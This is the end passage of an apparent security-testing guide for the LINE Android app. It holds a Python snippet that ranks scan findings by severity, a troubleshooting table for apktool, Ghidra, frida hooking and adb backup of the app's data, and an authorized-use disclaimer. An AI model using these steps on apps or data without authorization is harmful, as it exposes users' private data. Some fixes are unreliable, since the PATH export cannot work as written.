> if 'components' in data:
>
> findings += \[{\*\*x, 'source': name} for x in data\['components'\]
>
> if x.get('severity') in ('CRITICAL','HIGH')\]
>
> except: pass
>
> findings.sort(key=lambda x:
> \['CRITICAL','HIGH','MEDIUM','LOW','INFO'\]
>
> .index(x.get('severity','INFO')))
>
> print(f'Total findings: {len(findings)}')
>
> for f in findings:
>
> sev = f.get('severity','?')
>
> src = f.get('source','?')
>
> key = f.get('key') or f.get('algorithm') or f.get('class_name','?')
>
> print(f' \[{sev}\] {key} ({src})')
>
> EOF

**8. Troubleshooting**

|                                                |                                                                                                   |
|------------------------------------------------|---------------------------------------------------------------------------------------------------|
| **apktool: brut.androlib.AndrolibException**   | APK uses newer/unknown framework. Run: apktool if --tag latest framework.jar then retry.          |
| **Ghidra: OutOfMemoryError**                   | Increase heap: edit GHIDRA_HOME/support/analyzeHeadless and set MAXMEM=4G                         |
| **apkleaks: jadx not found**                   | Install jadx and ensure it is in PATH: export PATH=\$PATH:\$(which jadx)                          |
| **frida: Failed to attach: process not found** | App may not be running. Use -f flag to spawn: frida -U -f jp.naver.line.android -l script.js      |
| **adb backup: Full backup not allowed**        | Manufacturer or app may disable backups. Try: adb backup -noapk -nosystem jp.naver.line.android   |
| **smali grep returns nothing**                 | LINE uses multiple dex files. Scan all smali\* directories: find line_decompiled -name '\*.smali' |
| **.apkm has no base.apk**                      | Some bundles use arm64-v8a.apk as the primary. Rename it to base.apk and proceed.                 |
| **PoC scripts: ModuleNotFoundError**           | All PoC scripts use only Python stdlib — no pip install needed. Ensure Python 3.9+.               |

*EDUCATIONAL PURPOSE ONLY — This guide is intended for authorized
security research and penetration testing. Unauthorized analysis of
applications you do not own or have explicit written permission to test
may violate applicable computer crime laws.*
